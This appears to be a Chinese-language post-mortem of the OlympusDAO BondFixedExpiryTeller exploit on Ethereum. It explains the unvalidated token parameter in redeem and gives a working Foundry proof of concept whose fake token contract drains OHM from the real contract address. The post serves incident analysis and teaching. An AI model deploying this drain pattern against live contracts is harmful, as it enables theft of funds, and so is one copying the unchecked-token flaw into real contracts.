# BondFixedExpiryTeller 攻击案例分析


OlympusDao BondFixedExpiryTeller 攻击案例分析

<!--more-->

## 漏洞分析

攻击发生在以太坊链https://etherscan.io/tx/0x3ed75df83d907412af874b7998d911fdf990704da87c2b1a8cf95ca5d21504cf

存在漏洞的合约地址为: [0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156](https://etherscan.io/address/0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156#code)

在其中的`BondFixedExpiryTeller.sol`存在`redeem`函数, 代码如下:

```solidity
    function redeem(ERC20BondToken token_, uint256 amount_) external override nonReentrant {
        if (uint48(block.timestamp) < token_.expiry())
            revert Teller_TokenNotMatured(token_.expiry());
        token_.burn(msg.sender, amount_);
        token_.underlying().transfer(msg.sender, amount_);
    }
```

这个函数的含义是"存在tokenA, 将tokenA毁掉一定数量, 并将相同数量的tokenB发送给msg.sender, 其中tokenB由tokenA的underlying()函数来指定"

其中 `token_.underlying().transfer(msg.sender, amount_);`就是直接调用的tokenX的transfer()函数将其转给msg.sender, 也就是说该合约中如果存在任何IERC20(或类似的有转账函数的币)都可以通过这句代码转给msg.sender.

合约中有哪些币呢? 在区块链浏览器上可以看到有很多[OHM](https://etherscan.io/token/0x64aa3364f17a4d01c6f1751fd97c2bd3d7e7f1d5?a=0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156)被转到了该合约, 查看OHM的代码

```solidity
contract OlympusERC20Token is ERC20Permit, IOHM, OlympusAccessControlled {
}

interface IOHM is IERC20 {
}
```



## POC

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);

    function decimals() external view returns (uint8);
}

interface IBondFixedExpiryTeller {
    function redeem(address token_, uint256 amount_) external;
}

IERC20 constant OHM = IERC20(0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5);

//buggy:
IBondFixedExpiryTeller constant BondFixedExpiryTeller = IBondFixedExpiryTeller(
    0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156
);

contract FakeToken {
    function underlying() external pure returns (address) {
    		//指向 OHM
    		//这样redeem()函数中的
    		// token_.underlying().transfer(msg.sender, amount_);
    		// 就变成了
    		// OHM.transfer(msg.sender, amount_);
        return address(OHM);
    }

    // 绕过require
    function expiry() external pure returns (uint48 _expiry) {
        return 1;
    }

    function burn(address, uint256) external {}
}

//attack TX: https://etherscan.io/tx/0x3ed75df83d907412af874b7998d911fdf990704da87c2b1a8cf95ca5d21504cf
contract Hack is Test {
    function setUp() public {
        vm.createSelectFork("theNet", 15794360); //ETH
    }

    function testPoc() public {
        FakeToken ft = new FakeToken();
        BondFixedExpiryTeller.redeem(address(ft), 1000 * 10 ** OHM.decimals());
        emit log_named_decimal_uint(
            "OHM balance:",
            OHM.balanceOf(address(this)),
            OHM.decimals()
        );
    }
}

```




